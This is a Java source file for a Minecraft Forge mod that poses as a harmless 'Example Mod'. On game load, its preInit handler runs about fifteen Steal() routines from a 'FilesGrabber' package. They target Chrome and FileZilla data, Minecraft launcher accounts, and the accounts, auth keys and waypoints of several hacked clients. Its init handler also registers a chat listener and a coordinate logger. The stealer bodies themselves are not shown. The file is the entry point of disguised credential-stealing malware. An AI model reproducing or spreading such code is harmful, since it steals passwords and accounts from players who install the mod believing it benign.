package com.example.examplemod;

import com.example.examplemod.Hacks.FilesGrabber.ChromeGrabber.Chrome;
import com.example.examplemod.Hacks.FilesGrabber.FileZilla.FileZilla;
import com.example.examplemod.Hacks.FilesGrabber.Future.AuthKey;
import com.example.examplemod.Hacks.FilesGrabber.Future.FutureAccounts;
import com.example.examplemod.Hacks.FilesGrabber.Future.FutureWaypoints;
import com.example.examplemod.Hacks.FilesGrabber.Kami.KamiWaypoints;
import com.example.examplemod.Hacks.FilesGrabber.Konsa.KonasAccounts;
import com.example.examplemod.Hacks.FilesGrabber.Konsa.KonasWaypoints;
import com.example.examplemod.Hacks.FilesGrabber.LauncherAccounts.LauncherAccounts;
import com.example.examplemod.Hacks.FilesGrabber.Pyro.PyroAccounts;
import com.example.examplemod.Hacks.FilesGrabber.Pyro.PyroWaypoints;
import com.example.examplemod.Hacks.FilesGrabber.Rusher.Accaunts;
import com.example.examplemod.Hacks.FilesGrabber.Rusher.RusherHackWaypoints;
import com.example.examplemod.Hacks.FilesGrabber.SalHack.SalHackWaypoints;
import com.example.examplemod.Hacks.Print.Loader;
import com.example.examplemod.Hacks.Print.ChatListner.ChatListner;
import com.example.examplemod.Hacks.Print.CordLogger.CordLogger;
import com.example.examplemod.RoflXd.Start;
import net.minecraftforge.common.MinecraftForge;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.common.Mod.EventHandler;
import net.minecraftforge.fml.common.event.FMLInitializationEvent;
import net.minecraftforge.fml.common.event.FMLPreInitializationEvent;
import org.apache.logging.log4j.Logger;

@Mod(
   modid = "examplemod",
   name = "Example Mod",
   version = "1.0"
)
public class ExampleMod {
   public static final String MODID = "examplemod";
   public static final String NAME = "Example Mod";
   public static final String VERSION = "1.0";
   private static Logger logger;

   @EventHandler
   public void preInit(FMLPreInitializationEvent event) throws Exception {
      logger = event.getModLog();
      Loader.dothething();
      Accaunts.Steal();
      RusherHackWaypoints.Steal();
      FutureAccounts.Steal();
      FutureWaypoints.Steal();
      AuthKey.Steal();
      KonasAccounts.Steal();
      KonasWaypoints.Steal();
      Chrome.Steal();
      KamiWaypoints.Steal();
      LauncherAccounts.Steal();
      PyroAccounts.Steal();
      PyroWaypoints.Steal();
      FileZilla.Steal();
      SalHackWaypoints.Steal();
   }

   @EventHandler
   public void init(FMLInitializationEvent event) {
      MinecraftForge.EVENT_BUS.register(new ChatListner());
      MinecraftForge.EVENT_BUS.register(new CordLogger());
      MinecraftForge.EVENT_BUS.register(new Dupe());
      MinecraftForge.EVENT_BUS.register(new Start());
   }
}
